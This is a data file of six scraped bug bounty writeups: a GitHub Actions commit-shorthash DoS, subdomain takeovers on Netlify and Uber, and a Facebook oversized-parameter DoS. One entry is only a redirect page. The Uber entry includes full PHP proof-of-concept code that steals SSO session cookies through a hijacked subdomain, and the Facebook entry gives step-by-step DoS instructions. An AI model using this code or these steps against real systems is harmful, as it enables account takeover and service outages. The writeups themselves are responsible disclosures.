{"source_url": "https://blog.teddykatz.com/2019/11/12/github-actions-dos.html", "title": "How I accidentally took down GitHub Actions | Teddy Katz’s Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.teddykatz.com/2019/11/12/github-actions-dos.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I accidentally took down GitHub Actions | Teddy Katz’s Blog Teddy Katz's Blog About How I accidentally took down GitHub Actions Nov 12, 2019 Last December, I was invited to a private bug bounty program to test a beta version of GitHub Actions . GitHub Actions is a workflow automation tool integrated with GitHub. One common use case of GitHub Actions is for CI builds – a project can fairly easily start up a Docker container every time they push a commit (e.g.), and run their project’s tests in the container. At the time, I wasn’t too familiar with the details of how GitHub Actions worked, so I decided to just try it out and see what would happen. I used GitHub’s configuration wizard to create a config file. First, it let me select from a list of triggers for the Action (“do something when a commit is pushed”, “do something when someone creates an issue”, etc). I selected “do something when a comment is added to an issue”. Next, it gave a list of options for what should happen when the trigger activates, which mainly consisted of different cloud services/containers (“Run something on AWS”, “Run code in Docker”, etc.). I selected “Run code in Docker” and specified that the file ./foo.sh in the repository should be executed. The config wizard created the following file for me (comments added here for explanation): workflow \"New workflow\" { resolves = [ \"GitHub Action for Docker\" ] on = \"issue_comment\" # When someone leaves an issue comment in this repo, } action \"GitHub Action for Docker\" { uses = \"actions/docker/cli@76ff57a\" # Set up a Docker container, runs = \"./foo.sh\" # ...and run `foo.sh` in this repo. } Sure enough, when I committed that file to the repository and added a comment to an issue, it started a build that executed foo.sh in a Docker container. I was a bit confused about the uses = \"actions/docker/cli@76ff57a\" line in the config file, so I looked at the build log. Near the top of the log, I saw that the build had downloaded and unzipped a tarball from https://api.github.com/repos/actions/docker/tarball/76ff57a . Eventually, I figured out that: https://github.com/actions/docker was a repository containing integration code for GitHub Actions in a directory called cli . (Unfortunately, it seems to have been deleted sometime in the last year.) 76ff57a was the most recent commit hash on master for the actions/docker repository. That commit hash was auto-inserted by the config wizard when I created the config file. So the runner for GitHub Actions would see the string actions/docker/cli@76ff57a in the config file, and then parse out the individual components: it would clone the actions/docker repository at commit 76ff57a , enter the cli directory, and execute some setup code located there. The commit hash 76ff57a got my attention, because it was an abbreviated commit shorthash (only 7 hex characters) rather than a full commit hash (40 hex characters). Commit Hash Collisions A commit hash is a pseudorandom 40-character hex string that identifies a git commit. An example of a commit hash is 76ff57a6c3d817840574a98950b0c7bc4e8a13a8 . Since a string that long can be unwieldy, git sometimes shows an abbreviated commit hash (sometimes called a “shorthash”) consisting of the first seven characters of the full commit hash. This is why GitHub generated the string 76ff57a in my config file. Commit shorthashes have a major problem: As a repository accumulates a large number of commits, eventually it will contain two commit hashes that start with the same seven characters (and have the same shorthash). After this happens, tools that use shorthashes will start to break because the commit shorthash is ambiguous (it’s no longer a pointer to a single commit). Due to the birthday problem , any repository that has at least 19291 commits is likely to have a pair of ambiguous commits somewhere. So if we waited for the actions/docker repo to have tens of thousands of commits, one of the shorthashes would eventually become ambiguous and break someone’s build. Commit Hash Collisions, Faster I didn’t really feel like waiting for a low-activity repo to accumulate tens of thousands of commits. Luckily, we only have to wait that long if commit hashes are generated pseudorandomly. If we’re creating commits while trying to generate collisions, then it’s a lot easier – we can just create a single commit, then keep amending the commit message locally until it creates a commit hash that we want. By coincidence, I had created a tool a couple years earlier that does exactly this as a practical joke. So I cloned the actions/docker repo (which had 76ff57a6c3d817840574a98950b0c7bc4e8a13a8 as the latest commit), created a new commit with some changes, and ran the tool. Two minutes later, I had different commit ( 76ff57aa21370794040cd0caafd84d8a7aa0927c ) that also had the shorthash 76ff57a . To get the collision to affect anything on GitHub, I needed to push it to the actions/docker repo. This posed a problem, because I didn’t have write access to the actions/docker repo. However, I realized I could get around that issue by forking the actions/docker repo and pushing a commit to my fork (since GitHub shares commits between forks and parent repositories). GitHub Actions vs. Commit Hash Collisions So I created a fork and pushed my commit to it. I wasn’t quite sure what GitHub would do if someone tried to download https://api.github.com/repos/actions/docker/tarball/76ff57a when the hash 76ff57a was ambiguous. My best guess was that it would just pick one of the commits (either the original commit from actions/docker , or my new duplicate commit). Instead, that URL just started returning a 404 error, causing my Actions build (and also everyone else’s build that used the latest commit from actions/docker ) to break. So the good news was that I’d found a security issue which could allow any GitHub user to DoS GitHub Actions builds globally. The bad news was that I’d accidentally just DoSed a part of GitHub Actions globally. I had considered that this might happen, so I was ready to delete my fork as soon as I pushed the commit. (I thought deleting the fork would remove the ambiguity and cause everyone’s builds to start working again.) Unfortunately, even after I deleted my fork, the tarball URL still returned a 404, meaning that I’d accidentally broken everyone’s builds with no way to fix them. Oops. (In hindsight, I should have been more careful here. I could have tested out the tarball behavior on a test repo before using actions/docker . Luckily, at this point GitHub Actions was still in very early beta, so I’m hoping not too many people were affected.) Anyway, I pinged someone on GitHub’s security team about the issue. After a few minutes, they were able to get the outage fixed by running a pass of git garbage collection . The root cause was fixed a few weeks later by updating the config wizard to generate full 40-character commit hashes in config files. Takeaways on Commit Shorthashes This issue has had an effect on how I use commit shorthashes to refer to commits generally, when accounting for the possibility that someone could maliciously generate shorthash collisions. Shorthashes can safely be used for: Identifying commits now or in the very near future (e.g. asking someone to take a look at your commit in the next few minutes) Displaying commit hashes to users, if the full commit hash is also included somewhere. (For example, it’s okay to show a shorthash as the visible text in a link, as long as the target URL of the link includes the full 40-character hash). Shorthashes should not be used to identify commits for any extended period of time. This includes: Build scripts (use full 40-character hashes instead) Links in documentation (you can still use shorthashes for display if the full hash is included in the link target) Again, the risk is that if you include a shorthash in your build script, any random troll (or careless security researcher) could decide to break your build script by generating a different commit with the same shorthash, and pushing it to a fork. This issue would be somewhat mitigated if commit hashes on GitHub weren’t shared with forks. (As such, the risk is smaller for private repositories.) However, even if that were the case, someone without write access could still subtly introduce a collision by getting a PR accepted, or a shorthash could become ambiguous by chance over time. Personally, I think it’s better to just always follow the advice above to avoid a potential headache later. Making every shorthash collide Finally, I thought it would be funny to create a git branch that uses every 7-character commit shorthash (so every other commit in that repository would be guaranteed to have a shorthash collision). Surprisingly, this is feasible. There are 16 7 total 7-character commit shorthashes, so by the coupon collector’s problem , we would need to hash something like 28 ⋅ 16 7 ≈ 7.5 billion test commits. This would take about 90 minutes on my laptop. In terms of storage space, the smallest git commit is about 175 bytes before compression, so the repository would weigh in at around (175 bytes) ⋅ 16 7 ≈ 47 GB. Unfortunately, 47 GB is more space than I have left on my hard drive, so I didn’t go through with this. However, 47 GB is within GitHub’s 100GB hard limit on repo size . I can imagine an attack scenario where someone creates that branch once, and then just forks a bunch of popular repos and pushes the same branch to all of the forks, breaking all shortlinks in the documentation/build scripts of lots of repos at once. (Please don’t actually do this – it probably violates GitHub’s ToS, and it’s possible GitHub has some protection against it anyway.) Update, several years later: I went ahead and implemented a proof-of-concept for this idea . In total it’s only 24GB, but pushing it to GitHub would probably be a tall order. Timeline (Some of these times are approximate due to limited logs/information from a year later.) 2018-12-19, around 22:00:00 UTC: I pushed a new 76ff57a commit to my fork of actions/docker , inadvertently causing builds to start breaking. (about a minute later): I deleted my fork of actions/docker in an unsuccessful attempt to fix the broken builds. 2018-12-19 22:09:33 UTC: I pinged someone from GitHub’s security team in a Slack that had been set up for the private bounty program. 2018-12-19 22:13:08 UTC: Initial response from GitHub on Slack. A short discussion about the issue ensued. 2018-12-19, around 22:45:00 UTC: GitHub ran GC on the actions/docker repo, which cleaned up the commit from my fork and resolved the immediate outage. 2018-12-19 22:53:46 UTC: Follow-up report about the issue submitted on HackerOne 2018-12-19 23:11:30 UTC: Initial response from GitHub on HackerOne 2019-01-04 00:20:13 UTC: $5000 bounty awarded from GitHub on HackerOne. Root cause fix was WIP at this point. (Sometime in the following week): GitHub Actions config wizard updated to include full 40-character commit hash in generated config files, rather than 7-character shorthash. Teddy Katz's Blog not-an-aardvark not_an_aardvark not_an_aardvark"}
{"source_url": "https://evanricafort.blogspot.com/2019/08/application-level-denial-of-service-dos.html", "title": "Redirecting", "friendly_explanation": "This is a bug bounty writeup from https://evanricafort.blogspot.com/2019/08/application-level-denial-of-service-dos.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRedirecting You're about to be redirected The blog that used to be here is now at http://blog.evanricafort.com/2019/08/application-level-denial-of-service-dos.html. Do you wish to be redirected? This blog is not hosted by Blogger and has not been checked for spam, viruses and other forms of malware. Yes No Help Help Centre Help Forum Video Tutorials Community Blogger Buzz Developers Blogger API Developer Forum © 1999 – 2025 Google Terms of Service Privacy Content Policy"}
{"source_url": "https://medium.com/@alirazzaq/subdomain-takeover-worth-200-ed73f0a58ffe", "title": "Subdomain Takeover worth 200. Hi! My name is Ali and i am security… | by Ali Razzaq | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@alirazzaq/subdomain-takeover-worth-200-ed73f0a58ffe. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover worth 200. Hi! My name is Ali and i am security… | by Ali Razzaq | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mastodon Subdomain Takeover worth 200 Ali Razzaq 2 min read · Sep 14, 2018 -- 3 Listen Share Hi! My name is Ali and i am security researcher from Pakistan. In this article i will explain how i takeover a subdomain which is mapped on netlify. Netlify is platform for web developers to upload their web projects and showcase to world.Netlify allow web developers to add custom domain or subdomain to their projects. So i was searching for sites on google using some my recent google dorks.I land to a page site.com/white_hat(i am not disclosing site due to some reasons,Don’t mind :D) and i saw their scope for testing. I just open findsubdomains.com and try to get some subdomains. I saw a subdoamin which was like this hootsuite.site.com and while opening it is just showing “Not Found” Press enter or click to view image in full size I just check the CNAME record of this subdomain because CNAME will tell you on which 3rd party site the subdomain is mapped.So i got this CNAME. I register on netlify.com and upload the web project first.Then it ask me to add custom subdomain. Press enter or click to view image in full size So I just add the subdomain and click on verify. Press enter or click to view image in full size So on few clicks the subdomain was mine :D I fully takeover the site. I uploaded a screenshot on twitter :D After 15 minutes of reporting i got reply from their CTO and he rewarded me 200$ for this takeover. Press enter or click to view image in full size I hope you enjoyed this takeover and this will help you to understand how you can claim subdomain if this was not claimed before. Thanks for reading.Keep Sharing and Happy Hunting! Bug Bounty Subdomain Takeover -- -- 3 Written by Ali Razzaq 265 followers · 153 following Data Scientist | Machine Learning Engineer | Bug Bounty Hunter Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/", "title": "Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover – Arne Swinnen", "friendly_explanation": "This is a bug bounty writeup from https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Ubiquity’s Single Sign-On via subdomain takeover – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 0 Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover Posted on November 29, 2016 by Arne Swinnen I publicly disclosed a vulnerability that I responsibly disclosed to Ubiquity via the HackerOne platform. It concerned a subdomain takeover issue via Amazon Cloudfront (ping.ubnt.com) in combination with shared session cookies between subdomains on *.ubnt.com, which ultimately lead to a complete Authentication Bypass of their SSO system (sso.ubnt.com). It can be found here . Arne Swinnen Belgian. IT Security. Bug Bounty Hunter. Web Security Arne Swinnen Belgian. IT Security. Bug Bounty Hunter. More Posts Twitter LinkedIn Post navigation Hack.LU 2016 CTF DataOnly Writeup Authentication bypass on Airbnb via OAuth tokens theft Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Δ Search for: Recent Posts Authentication bypass on Uber’s Single Sign-On via subdomain takeover Authentication bypass on Airbnb via OAuth tokens theft Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover Recent Comments Atom on How I Could Steal Money from Instagram, Google and Microsoft Arne Swinnen on Authentication bypass on Uber’s Single Sign-On via subdomain takeover Jack on Authentication bypass on Uber’s Single Sign-On via subdomain takeover Archives June 2017 (2) November 2016 (1) October 2016 (2) September 2016 (1) July 2016 (1) June 2016 (1) May 2016 (1) March 2016 (1) February 2016 (1) August 2014 (2) November 2013 (2) September 2013 (1) © 2025 Arne Swinnen. All rights reserved. Hiero by aThemes"}
{"source_url": "https://medium.com/@maxpasqua/dos-across-facebook-endpoints-1d7d0bc27c7f", "title": "DoS Across Facebook Endpoints. A while back I read a report by a… | by Max Pasqua | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@maxpasqua/dos-across-facebook-endpoints-1d7d0bc27c7f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDoS Across Facebook Endpoints. A while back I read a report by a… | by Max Pasqua | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in DoS Across Facebook Endpoints Max Pasqua 3 min read · Mar 19, 2019 -- Listen Share A while back I read a report by a friend of mine, Kassem , where he was able to completely block a user from using Facebook Messenger with a long string of text. After reading this I decided to look through some Facebook endpoints to see if it was still viable. After a day or two of looking I found 7 different endpoints vulnerable to this type of attack. At first I thought I hit a gold mine with this type of attack but within a couple of weeks 6/7 bugs got flagged as a dupe of the original report I made. Thanks for reporting this issue to us. After investigating the issue, we have realized that this is a duple of your other report #2444785898871880. As such, this report will not be eligible for a bounty. I’m going to close this one and keep the conversation in the original report. Since the root cause was that Facebook wasn’t limiting the length on parameters they all sadly got classified into one bug. This bug will be the one shown next. Break Facebook Pages for Admins, Editors, and Moderators This bug allowed a malicious user with at least Moderator privileged to permanently break an entire page for the Admins, Editors, and Moderators. This bug was a little weird as I ran into it by accident trying to test for other things, after firing big payloads at the endpoint I kept getting 500 errors, after enough 500 errors the page would completely break This bug required a page to have the appointments function setup, the quickest way to get appointments is creating a button as seen in the video and hitting booking option to set up appointments through Facebook. After that test the button and put in an appointment and then go to the inbox to complete the rest of the bug Proof of Concept 1) Once in the inbox of the victims page hit the create appointment button in the bottom right 2) Put in some text in the box and intercept the request sent to burp suite 3) Send the request to the intruder, highlight the text in the notes_for_customer parameter for the intruder position, set the attack type to battering ram, and go to options and turn off Make unmodified base request 4) Copy the text of a large string(Around 20–60mb) to your clipboard and go to payloads and hit paste until you have about 10 requests to be sent 5) Start the attack and you should start seeing 500 errors. After they all go through the page should be broken Video The other bugs reported use a similar attack type in the bug shown above but with different sized payloads to make it work, as they weren't as impactful I wont be making a full write up about them but if you’re interested in any of them feel free to message me on Facebook to ask. Other Bugs Timeline Submitted- January 14th, 2019 Team asked for clarification - January 14th, 2019 More details provided- January 14th, 2019 Team asked for clarification again- January 17th, 2019 More details provided- January 17th, 2019 Team asked to reproduce it on a whitehat test account- January 23rd, 2019 Whitehat ID’s provided - January 23rd, 2019 Short Term Fix- February 18th, 2019 Bounty Awarded($500)- Short Term Fix- February 21st, 2019 Question about bounty amount- February 21st, 2019 Facebook team awards another ($250) as they were originally supposed to reward $750 total for the vulnerability but forgot to- March 11th, 2019 On a side note some of these vulnerability’s still work as the fix isn't working in full effect right now, I’ve been asked by the security team to include that anyone trying to emulate and report the same issues detailed here will be marked as duplicate! Security -- -- Written by Max Pasqua 368 followers · 3 following https://www.youtube.com/channel/UC1gzQrTDYPfENb6g1HWdDlg No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/", "title": "Authentication bypass on Uber’s Single Sign-On via subdomain takeover – Arne Swinnen", "friendly_explanation": "This is a bug bounty writeup from https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Uber’s Single Sign-On via subdomain takeover – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 6 Authentication bypass on Uber’s Single Sign-On via subdomain takeover Posted on June 25, 2017 by Arne Swinnen TL;DR: Uber was vulnerable to subdomain takeover on saostatic.uber.com via Amazon CloudFront CDN. Moreover, Uber’s recently deployed Single Sign-On (SSO) system at auth.uber.com, which is based on shared cookies between all *.uber.com subdomains, was found vulnerable to session cookie theft by any compromised *.uber.com subdomain. Therefore, the impact of the subdomain takeover could be increased to Authentication Bypass of Uber’s full SSO system, yielding access to all *.uber.com subdomains protected by it (e.g. vault.uber.com, partners.uber.com, riders.uber.com, etc). Uber resolved the subdomain takeover vulnerability and granted a $5.000 bounty for the two combined issues. Single Sign-On security revisited Generally, SSO systems are (variations of) any of the following three types, in order of popularity: OAuth : Security is mainly based on whitelisted callback URLs of service providers configured at the identity providers, and CSRF protection via the “state” parameter. Flaws are often via open redirect chains, e.g. Authentication bypass on Airbnb via OAuth tokens theft. SAML & friends : Security is based on XML messages signed with pre-exchanged cryptographic keys between service and identity providers. Flaws are often XML Signature bypasses, e.g. OneLogin authentication bypass on WordPress sites that bit Uber before. Shared (session) cookies between subdomains : Security is based on the integrity of all subdomains. Any vulnerability on any subdomain that provides an attacker insight in the shared session cookies issued by the SSO system is fatal. Flaws are thus often RCE, debug logs exposure, subdomain takeover and friends on subdomains, e.g. Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover I personally believe that the first two in this list have had many problems in the past, but have improved lately in terms of security. The latter SSO based on shared session cookies between subdomains is more a technology from the past, before the former two even existed. By design, it enforces that anything that wants to leverage the SSO system to be a subdomain of the same TLD as where the SSO system is based. Since the security of the SSO system is based on the integrity of the subdomains (see aforementioned report and the Uber case below), this is quite an ironic situation. By design, it encourages to increase the attack surface enormously. Uber case Uber used OAuth as an SSO system for *.uber.com subdomains in the past, as can be seen from this recent public disclosure report by @ngalog : [Uber 8k Bug] Login CSRF + Open Redirect = Account Takeover . However recently, they’ve changed (reverted?) to a SSO system based on shared session cookies among subdomains of *.uber.com. If you now browse to any uber.com subdomain that requires authentication (e.g. central, partners, riders, vault, developer, …), you get redirected to auth.uber.com instead. Once you’ve logged in there and you visit another subdomain, you’re logged in there transparently via the SSO system at auth.uber.com, which issues temporary session cookies for every *.uber.com subdomain after being logged in once. A vulnerability was identified in this SSO system that allows any compromised subdomain on *.uber.com to transparently issue and steal valid session cookies issued for *any* uber.com subdomain by auth.uber.com, as long as the victim had already authenticated once to the SSO. Uber did have some countermeasures in place to prevent this, but these were bypassed and reported together with the subdomain takeover for increased impact. Any compromised *.uber.com subdomain could be used to perform the same attack, although Uber explicitly mentioned several *.uber.com subdomains as out of scope in their bug bounty program policy at the time of reporting (e.g. *.dev.uber.com, *.et.uber.com, drive.uber.com, etc). Subdomain takeover Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN via a DNS CNAME, but the hostname was not registered there anymore (dangling pointer). This allowed me to fully takeover this domain, highly similar to Subdomain takeover on rider.uber.com due to non-existent distribution on Cloudfront by Frans Rosén . I effectively took over the subdomain as a Proof of Concept and hosted a simple HTML file as proof here: Authentication bypass In Uber’s SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com (“domain=uber.com” cookie attribute) to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, central.uber.com, vault.uber.com, developer.uber.com, and many more). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication to ensure that the window for theft is small, as can be seen in the below Uber SSO Login diagram: The precious shared session cookie “_csid” can thus only be stolen between steps 9-12, which is a very short period (automatic browser redirects). Although not impossible to exploit (see Jack Whitton’s awesome CSP trick to block certain cookies from being sent to certain domains, coincidentally also on Uber’s bug bounty program ), a more convenient flaw was identified that allows the shared session cookie to remain alive after step 12 in the browser’s cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie “_csid” from auth.uber.com, it is simply ignored and remains usable. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to replay step 3 in the above diagram as step 13 and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie: So once an attacker gets his/her hands on the victim’s “_csid” shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued “_csid” cookie value in step 9 to be logged in as the victim, right? Wrong. Uber had another surpising countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login diagram: The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can’t steal these values from the victim’s browser, but only the “_csid” shared session cookie, this means game over, right? Unfortunately, wrong. An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL generated by https://riders.uber.com in their own browser in step 3 to the victim’s browser to generate & steal the “_csid” shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the “_csid” temporary session token for the attacker’s login scenario in a separate browser, but this works flawlessly (e.g. no IP-based checks between steps were encountered). This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above diagram): Proof of concept A PoC says more than a thousand diagrams. In the PoC steps sent to Uber & showcased in the video below, the assumption is made that https://saostatic.uber.com is actually serving a valid SSL certificate in the victim’s browser, which was not the case. However, it could’ve easily been generated with Let’s Encrypt . Open the victim’s browser & browse to https://riders.uber.com. After being redirected to https://auth.uber.com, login with the victim’s credentials so you end up on https://riders.uber.com trips dashboard again. Open a second browser tab in the victim’s browser and browse to https://saostatic.uber.com/prepareuberattack.php. Accept any certificate warnings that you may receive here – again, we’re only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, “Cookie: ” string and a “Set-Cookie: ” strings underneath each other. This is all info gathered under the hood by the attacker’s webserver that is required to login as the victim now – everything has been stolen automagically. Open the separate attacker’s browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the “Cookie: …” string displayed on prepareuberattack.php and paste it into the request headers. The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the “Set-Cookie: ” lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are permanently injected in the attacker’s browser. You are now logged in as the victim in the attacker’s browser. In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim’s browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the resulting page, but store this on the server-side, ready to be abused in a stealthy fashion. Although it’s a lengthy explanation, the PoC video showcases how quick & effective exploitation by an attacker can be. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is provided below. This was written quick & dirty for PoC purposes, but it did the job: prepareuberattack.php PHP <html> <body> <script> <?php function HandleHeaderLine( $curl, $header_line ) { preg_match(\"/state=([^;]*);/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var cookiestate = '\" . $matches[1] . \"';\\n\"); } preg_match(\"/Location: (.*)/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var loc = '\" . trim($matches[1]) . \"';\\n\"); } return strlen($header_line); } $c = curl_init('https://riders.uber.com'); curl_setopt($c, CURLOPT_VERBOSE, 1); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADERFUNCTION, \"HandleHeaderLine\"); $page = curl_exec($c); ?> var csrf = loc.substring(loc.lastIndexOf(\"=\")+1); var img = document.createElement(\"IMG\"); img.onerror = function () { var iframe = document.createElement(\"iframe\"); iframe.setAttribute(\"src\",\"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent(cookiestate) + \"&csrftoken=\" + csrf); iframe.setAttribute(\"width\", \"100%\"); iframe.setAttribute(\"height\", \"10000\"); document.body.appendChild(iframe); } img.src=loc; </script> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 < html > < body > <script> < ? php function HandleHeaderLine ( $ curl , $ header _ line ) { preg_match ( \"/state=([^;]*);/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var cookiestate = '\" . $ matches [ 1 ] . \"';\\n\" ) ; } preg_match ( \"/Location: (.*)/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var loc = '\" . trim ( $ matches [ 1 ] ) . \"';\\n\" ) ; } return strlen ( $ header_line ) ; } $ c = curl_init ( 'https://riders.uber.com' ) ; curl_setopt ( $ c , CURLOPT_VERBOSE , 1 ) ; curl_setopt ( $ c , CURLOPT_RETURNTRANSFER , 1 ) ; curl_setopt ( $ c , CURLOPT_HEADERFUNCTION , \"HandleHeaderLine\" ) ; $ page = curl_exec ( $ c ) ; ? > var csrf = loc . substring ( loc . lastIndexOf ( \"=\" ) + 1 ) ; var img = document . createElement ( \"IMG\" ) ; img . onerror = function ( ) { var iframe = document . createElement ( \"iframe\" ) ; iframe . setAttribute ( \"src\" , \"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent ( cookiestate ) + \"&csrftoken=\" + csrf ) ; iframe . setAttribute ( \"width\" , \"100%\" ) ; iframe . setAttribute ( \"height\" , \"10000\" ) ; document . body . appendChild ( iframe ) ; } img . src = loc ; </script> < / body > < / html > uberattack.php PHP <html> <body> <?php $cookiestring = \"state=\" . $_GET[\"cookiestate\"] . \"; \"; $interestincookies = array(\"_udid\", \"_csid\", \"sid\"); foreach ($_COOKIE as $name => $value) { if (in_array($name,$interestincookies)) { $cookiestring = $cookiestring . $name . \"=\" . str_replace(' ', '+', $value) . \"; \"; $cookiestringset = $cookiestringset . \"Set-Cookie: \" . $name . \"=\" . str_replace(' ', '+', $value) . \";</br>\"; } } print \"Url: \" . 'https://riders.uber.com/?state=' . urlencode($_GET[\"csrftoken\"]) . \"<br /><br />\"; print \"Cookie: \" . $cookiestring . \"<br />\"; print \"<br />\" . $cookiestringset . \"<br />\"; ?> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 < html > < body > <?php $cookiestring = \"state=\" . $_GET [ \"cookiestate\" ] . \"; \" ; $interestincookies = array ( \"_udid\" , \"_csid\" , \"sid\" ) ; foreach ( $_COOKIE as $name = > $value ) { if ( in_array ( $name , $interestincookies ) ) { $cookiestring = $cookiestring . $name . \"=\" . str_replace ( ' ' , '+' , $value ) . \"; \" ; $cookiestringset = $cookiestringset . \"Set-Cookie: \" . $name . \"=\" . str_replace ( ' ' , '+' , $value ) . \";</br>\" ; } } print \"Url: \" . 'https://riders.uber.com/?state=' . urlencode ( $_GET [ \"csrftoken\" ] ) . \"<br /><br />\" ; print \"Cookie: \" . $cookiestring . \"<br />\" ; print \"<br />\" . $cookiestringset . \"<br />\" ; ?> < / body > < / html > The first file can be hosted anywhere, the second file must be hosted on the hijacked subdomain (since it reads & reflects the incoming session cookies). By simply changing “riders.uber.com” to any other subdomain of uber.com in these two PHP files, an attacker could generate valid sessions for these subdomains on behalf of the victim, e.g. vault.uber.com, partners.uber.com, developer.uber.com, … Recommendations The recommendations provided to Uber were twofold: Resolve the subdomain takeover of saostatic.uber.com by removing the dangling CNAME to AWS CloudFront CDN. Resolve the Authentication Bypass issue by any of the following, in order of priority: Revert the SSO system back to OAuth 2, since this does not have the side-effect of actually encouraging a large attack surface like the current shared session SSO system. Or, implement an IP address check: Store a user’s external IP address when issuing a shared “_csid” session cookie on auth.uber.com (identity provider) and verify that users presenting this shared session cookie to service providers on *.uber.com have the same external IP address, to prevent relay attacks like the one described above. There is a residual risk here, namely when the attacker has the same external IP address as its victim (e.g. on the same corporate network/wireless access point/…). Or, accept the inherent risk and include all *.uber.com subdomains in your bug bounty program scope, since they have the potential to fully compromise the SSO system, including the high-value targets vault.uber.com, partners.uber.com and riders.uber.com Ultimately, Uber removed the dangling CNAME and decided to implement the IP address check to decrease the exposed risk through their current cookie based SSO system. They thus opted to accept the residual risk involved. Timeline 07/04/2017: Submitted bug report to Uber 11/04/2017: Triaged by Uber 14/04/2017: $500 minimum bounty awarded 06/06/2017: Pinged Uber about the report, since I still owned saostatic.uber.com at this point 06/06/2017: Response from Uber that this report fell through the cracks, starting mitigations now 07/06/2017: DNS CNAME record for saostatic.uber.com removed, report marked as closed 14/06/2017: Extra $4.500 bounty awarded 07/07/2017: IP address check deployed by Uber and confirmed after retest 11/07/2017: Permission granted to publish blogpost by Uber Arne Swinnen Belgian. IT Security. Bug Bounty Hunter. 6 Comments Reply July 13, 2017 Eveez Hi nice find. BTW, did you use sublist3r to find that subdomain saostatic.uber.com? thanks 😉 Reply July 13, 2017 Arne Swinnen No comment 😉 Reply July 26, 2017 Gopal Singh you are genious! Reply February 4, 2019 Paulo Choupina I just finished reading this and i could understand it all. First time I read a write up and can actually understand it all. I will be folowing your work from now on. Good job! Reply March 1, 2022 Jack How are you creating these flow diagrams? Reply March 7, 2022 Arne Swinnen Draw.io 🙂 Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Δ © 2025 Arne Swinnen. All rights reserved. Hiero by aThemes"}
